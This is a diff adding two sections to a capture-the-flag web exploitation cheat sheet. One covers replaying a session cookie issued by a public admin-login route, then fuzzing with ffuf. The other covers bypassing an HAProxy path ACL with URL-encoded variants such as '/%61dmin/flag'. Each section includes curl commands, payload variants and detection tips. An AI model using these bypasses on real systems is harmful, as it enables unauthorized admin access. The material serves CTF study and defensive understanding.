@@ -12,10 +12,12 @@
 - [NoSQL Injection (MongoDB)](#nosql-injection-mongodb)
   - [Blind NoSQL with Binary Search](#blind-nosql-with-binary-search)
 - [Cookie Manipulation](#cookie-manipulation)
+- [Public Admin Login Route Cookie Seeding (EHAX 2026)](#public-admin-login-route-cookie-seeding-ehax-2026)
 - [Host Header Bypass](#host-header-bypass)
 - [Broken Auth: Always-True Hash Check (0xFun 2026)](#broken-auth-always-true-hash-check-0xfun-2026)
 - [/proc/self/mem via HTTP Range Requests (UTCTF 2024)](#procselfmem-via-http-range-requests-utctf-2024)
 - [Hidden API Endpoints](#hidden-api-endpoints)
+- [HAProxy ACL Regex Bypass via URL Encoding (EHAX 2026)](#haproxy-acl-regex-bypass-via-url-encoding-ehax-2026)
 
 ---
 
@@ -117,6 +119,31 @@ curl -H "Cookie: role=admin"
 curl -H "Cookie: isAdmin=true"
 ```
 
+## Public Admin Login Route Cookie Seeding (EHAX 2026)
+
+**Pattern (Metadata Mayhem):** Public endpoint like `/admin/login` sets a privileged cookie directly (for example `session=adminsession`) without credential checks.
+
+**Attack flow:**
+1. Request public admin-login route and inspect `Set-Cookie` headers
+2. Replay issued cookie against protected routes (`/admin`, admin APIs)
+3. Perform authenticated fuzzing with that cookie to find hidden internal routes (for example `/internal/flag`)
+
+```bash
+# Step 1: capture cookies from public admin-login route
+curl -i -c jar.txt http://target/admin/login
+
+# Step 2: use seeded session cookie on admin endpoints
+curl -b jar.txt http://target/admin
+
+# Step 3: authenticated endpoint discovery
+ffuf -u http://target/FUZZ -w words.txt -H 'Cookie: session=adminsession' -fc 404
+```
+
+**Detection tips:**
+- `GET /admin/login` returns `302` and sets a static-looking session cookie
+- Protected routes fail unauthenticated (`403`) but succeed with replayed cookie
+- Hidden admin routes may live outside `/api` (for example `/internal/*`)
+
 ## Host Header Bypass
 ```http
 GET /flag HTTP/1.1
@@ -191,3 +218,29 @@ target_sig = build_signature(secrets, b"flag")
 
 ## Hidden API Endpoints
 Search JS bundles for `/api/internal/`, `/api/admin/`, undocumented endpoints.
+
+Also fuzz with authenticated cookies/tokens, not just anonymous requests. Admin-only routes are often hidden and may be outside `/api` (for example `/internal/flag`).
+
+---
+
+## HAProxy ACL Regex Bypass via URL Encoding (EHAX 2026)
+
+**Pattern (Borderline Personality):** HAProxy blocks `^/+admin` regex pattern, Flask backend serves `/admin/flag`.
+
+**Bypass:** URL-encode the first character of the blocked path segment:
+```bash
+# HAProxy ACL: path_reg ^/+admin → blocks /admin, //admin, etc.
+# Bypass: /%61dmin/flag → HAProxy sees %61 (not 'a'), regex doesn't match
+# Flask decodes %61 → 'a' → routes to /admin/flag
+
+curl 'http://target/%61dmin/flag'
+```
+
+**Variants:**
+- `/%41dmin` (uppercase A encoding)
+- `/%2561dmin` (double-encode if proxy decodes once)
+- Encode any character in the blocked prefix: `/a%64min`, `/ad%6din`
+
+**Key insight:** HAProxy ACL regex operates on raw URL bytes (before decode). Flask/Express/most backends decode percent-encoding before routing. This decode mismatch is the vulnerability.
+
+**Detection:** HAProxy config with `acl` + `path_reg` or `path_beg` rules. Check if backend framework auto-decodes URLs.
